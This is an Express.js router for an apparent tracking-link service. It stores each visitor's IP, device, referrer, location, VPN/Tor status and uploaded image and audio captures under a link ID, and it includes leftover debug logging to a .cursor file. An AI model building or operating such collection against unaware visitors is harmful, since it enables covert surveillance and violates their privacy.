const express = require('express');
const Link = require('../models/link');
const linkController = require('../controllers/linkController');
const multerModule = require('../middleware/multer');
const upload = multerModule;
const handleMulterError = multerModule.handleMulterError;

const router = express.Router();

// Get all links
router.get('/', linkController.getLinks);

// Create a new link
router.post('/', linkController.createLink);

// Get link by Number (search by number like 527932)
router.get('/number/:number', linkController.getLinkByNumber);

// Get link by pageId (must be after /number/:number to avoid conflicts)
router.get('/:id', linkController.getLinkById);

// Record a visit
router.post('/:id/visit', linkController.recordVisit);

// Save log data to link
router.post('/:id/logs', async (req, res) => {
    try {
        const { id } = req.params;
        const logData = req.body;
        
        const link = await Link.findOne({ pageId: id });
        
        if (!link) {
            return res.status(404).json({ error: 'Link not found' });
        }
        
        const logEntry = {
            timestamp: logData.timestamp || new Date().toISOString(),
            request: {
                ip: logData.request?.ip || req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress,
                rawIp: logData.request?.rawIp || req.ip,
                referrer: logData.request?.referrer || req.headers.referer || '',
                userAgent: logData.request?.userAgent || req.headers['user-agent'] || ''
            },
            device: {
                browser: logData.device?.browser || '',
                os: logData.device?.os || '',
                device: logData.device?.device || '',
                deviceVendor: logData.device?.deviceVendor || '',
                deviceType: logData.device?.deviceType || ''
            },
            clientData: logData.clientData || {},
            network: logData.network || {
                ip: '',
                location: {},
                network: {},
                security: {
                    vpn: false,
                    proxy: false,
                    tor: false,
                    relay: false
                },
                is_private: false
            },
            captures: {
                image: logData.captures?.image || null,
                audio: logData.captures?.audio || null
            }
        };
        
        link.logs.push(logEntry);
        await link.save();
        
        res.json({ 
            success: true, 
            message: 'Log saved successfully',
            logId: link.logs[link.logs.length - 1]._id
        });
    } catch (error) {
        console.error('Error saving log:', error);
        res.status(500).json({ error: 'Server error', details: error.message });
    }
});

// Save capture - Upload file to Cloudinary
// This endpoint receives the actual file and uploads it
router.post(
    '/:id/capture', 
    (req, res, next) => {
        const fs = require('fs');
        const path = require('path');
        const logPath = path.join(__dirname, '..', '..', '.cursor', 'debug.log');
        const logEntry = JSON.stringify({location:'links.js:87',message:'CAPTURE ROUTE HIT',data:{pageId:req.params.id,method:req.method,hasFile:!!req.file,contentType:req.headers['content-type']},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'D'})+'\n';
        fs.appendFileSync(logPath, logEntry);
        next();
    },
    upload.single('file'),  // Multer middleware to handle file upload
    (req, res, next) => {
        const fs = require('fs');
        const path = require('path');
        const logPath = path.join(__dirname, '..', '..', '.cursor', 'debug.log');
        const logEntry = JSON.stringify({location:'links.js:90',message:'AFTER MULTER',data:{pageId:req.params.id,hasFile:!!req.file,fileFieldname:req.file?.fieldname,fileSize:req.file?.size,filePath:req.file?.path},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'D'})+'\n';
        fs.appendFileSync(logPath, logEntry);
        next();
    },
    handleMulterError,      // Error handling middleware
    linkController.saveCapture  // Controller that uploads to Cloudinary
);

// Save media - Save URLs and other data to database
// This endpoint receives the Cloudinary URLs and saves them
router.post('/:id/save-media', linkController.saveMedia);

// Delete a link
router.delete('/:id', linkController.deleteLink);

module.exports = router;
